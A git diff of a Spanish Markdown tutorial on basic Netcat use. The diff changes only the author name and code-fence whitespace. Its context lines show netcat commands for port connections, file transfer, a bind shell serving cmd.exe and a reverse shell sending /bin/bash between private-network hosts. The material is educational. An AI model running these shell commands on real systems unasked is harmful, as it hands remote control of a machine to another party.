@@ -1,6 +1,6 @@
 ---
 Title: Uso básico de Netcat
-Authors: Barckcode
+Authors: helmcode
 Date: 21/11/2020
 Categories: Linux
 ---
@@ -27,18 +27,18 @@ nc -nv 192.168.0.100 21
 - Ejemplo: Para este ejemplo vamos a utilizar el puerto 4444 y dos hosts:
 
   - host1: 192.168.0.100
-  
+
   - host2: 192.168.0.101
 
 En **host1** ejecutamos:
 
- ```bash
+```bash
 nc -nvlp 4444
 ```
 
 En **host2** ejecutamos:
 
- ```bash
+```bash
 nc -nv 192.168.0.100 4444
 ```
 
@@ -53,18 +53,18 @@ Para cortar la conexión. Basta con pulsar CTRL + C
 - Ejemplo: Para este ejemplo vamos a utilizar el puerto 4444 y dos hosts:
 
   - host1: 192.168.0.100
-  
+
   - host2: 192.168.0.101
 
 Desde **host1** vamos a recibir un fichero. A través del puerto 4444. Para ello ejecutamos:
 
- ```bash
+```bash
 nc -nvlp 4444 > archivo_recibido.txt
 ```
 
 En **host2** vamos a enviar el fichero por medio del mismo puerto. Para ello ejecutamos:
 
- ```bash
+```bash
 nc -nv 192.168.0.100 4444 < archivo_enviado.txt
 ```
 ---
@@ -73,18 +73,18 @@ nc -nv 192.168.0.100 4444 < archivo_enviado.txt
 - Ejemplo: Para este ejemplo vamos a utilizar el puerto 4444 y dos hosts:
 
   - host1: 192.168.0.100  ->  En este caso usaremos un Windows.
-  
+
   - host2: 192.168.0.101  ->  En este caso será un Linux.
 
 Desde **host1** vamos a servir la shell. A través del puerto 4444. Para ello ejecutamos:
 
- ```bash
+```bash
 nc -nvlp 4444 -e cmd.exe
 ```
 
 En **host2** vamos a conectarnos al puerto indicado para tomar el control de la shell. Para ello ejecutamos:
 
- ```bash
+```bash
 nc -nv 192.168.0.100 4444
 ```
 
@@ -96,18 +96,18 @@ En cuanto se ejecute lo anterior. Tendremos el control de la shell de **host1** 
 - Ejemplo: Para este ejemplo vamos a utilizar el puerto 4444 y dos hosts Linux:
 
   - host1: 192.168.0.100
-  
+
   - host2: 192.168.0.101
 
 Desde **host1** vamos a levantar el puerto 4444 para que este escuchando. Para ello ejecutamos:
 
- ```bash
+```bash
 nc -nvlp 4444
 ```
 
 En **host2** vamos a servir una shell a través del puerto indicado. Para ello ejecutamos:
 
- ```bash
+```bash
 nc -nv 192.168.0.100 4444 -e /bin/bash
 ```
 
